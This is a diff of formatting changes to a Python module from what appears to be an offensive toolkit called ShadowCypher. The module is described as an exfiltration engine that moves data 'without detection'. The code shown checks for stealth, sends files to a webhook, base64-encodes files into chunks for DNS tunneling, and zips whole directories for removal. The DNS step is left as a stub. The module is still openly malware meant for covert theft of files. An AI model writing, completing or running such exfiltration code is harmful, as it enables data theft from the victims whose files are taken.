@@ -3,11 +3,14 @@ ShadowCypher Exfiltration Engine — The Silent Thief.
 Handles data exfiltration via DNS tunneling, HTTP(S), and Webhooks.
 """
 
-import os
-import requests
 import base64
+import os
+
+import requests
+
 from shadowcypher.core.logger import logger
 from shadowcypher.core.stealth import require_stealth
+
 
 class Exfiltration:
     """The 'Extractor' of the suite. Moving data without detection."""
@@ -18,7 +21,7 @@ class Exfiltration:
         require_stealth(on_output=on_output)
         if not os.path.exists(filepath):
             return f"[ERROR] FILE_NOT_FOUND: {filepath}"
-        
+
         file_size = os.path.getsize(filepath)
         if on_output:
             on_output(f"Sending {filepath} to webhook ({file_size} bytes)")
@@ -48,12 +51,12 @@ class Exfiltration:
 
         with open(filepath, 'rb') as f:
             encoded = base64.b64encode(f.read()).decode()
-        
+
         # Split into 60-character chunks (safe for DNS)
         chunks = [encoded[i:i+60] for i in range(0, len(encoded), 60)]
         if on_output:
             on_output(f"[EXFIL] READY_TO_TRANSMIT_{len(chunks)}_DNS_FRAGMENTS.")
-        
+
         # Real logic would use 'dig' or similar to send queries
         return "STAGED: DNS fragments generated. Authoritative server required for capture."
 
@@ -81,7 +84,7 @@ class Exfiltration:
             if on_output:
                 on_output("[EXFIL] WARNING: 7z not found, falling back to unencrypted zip")
             with zipfile.ZipFile(out_zip, 'w', zipfile.ZIP_DEFLATED) as zf:
-                for root, dirs, files in os.walk(dir_path):
+                for root, _, files in os.walk(dir_path):
                     for f in files:
                         zf.write(os.path.join(root, f), os.path.relpath(os.path.join(root, f), dir_path))
             return out_zip
